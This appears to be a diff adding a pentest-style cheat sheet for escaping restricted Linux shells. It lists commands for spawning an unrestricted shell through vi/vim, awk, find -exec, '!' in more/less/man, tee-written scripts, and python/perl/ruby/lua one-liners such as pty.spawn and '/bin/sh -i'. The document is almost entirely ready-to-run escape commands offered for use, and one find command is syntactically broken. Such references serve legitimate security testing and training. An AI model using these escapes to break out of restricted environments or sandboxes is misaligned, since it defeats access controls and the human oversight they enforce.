@@ -1,0 +1,60 @@
+####################################################################
+########### Escaping/Bypass from Jail/Restricted Linux Shells ######
+####################################################################
+
+Usign Editors : 
+
+One of the most well documented techniques is to spawn a shell from within an editor such as 'vi' or 'vim'. Open any file using one of these editors and type the following and execute it from within the editor:
+    :set shell=/bin/bash
+
+Next, type and execute:
+    :shell
+
+Another method is to type:
+    :! /bin/bash
+
+##################################################################################################################################
+
+Using Awk Command: 
+
+If you can run 'awk', you can attempt to execute a shell from within it.
+Type the following:
+    awk 'BEGIN {system("/bin/sh")}'
+#################################################################################################################################
+Find Command : 
+
+If the 'find' command is present, you can attempt to use the '-exec' function within it.
+Type the following:
+    find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+
+#################################################################################################################################
+More, Less, and Man Commands :
+There is a known escape within these commands. After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file:
+    '! /bin/sh'
+    '!/bin/sh'
+    '!bash'
+
+Like the shell escape in 'awk' and 'find', if successful, you'll be sitting at an unrestricted shell prompt. 
+Note you can try different shells, and the space after the '!' may not matter.
+#################################################################################################################################
+
+Tee Command :
+
+If you do not have access to an editor, and would like to create a script, you can make use of the 'tee' command. 
+Since you cannot make use of '>' or '>>', the 'tee' command can help you direct your output when used in tandem with the 'echo' command. 
+This is not a shell escape in of itself, but consider the following:
+    echo "evil script code" | tee script.sh
+#################################################################################################################################
+
+Try invoking a SHELL through your favorite language:
+    python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
+    perl -e 'exec "/bin/sh";'
+    perl: exec "/bin/sh";
+    ruby: exec "/bin/sh"
+    lua: os.execute('/bin/sh')
+    irb(main:001:0> exec "/bin/sh"
+    python -c 'import pty;pty.spawn("/bin/bash")'
+    echo os.system('/bin/bash')
+    echo /usr/local/rbin/*
+    /bin/sh -i
+Most likely, you will not be able to execute any of these, but it's worth a shot in case they're installed.
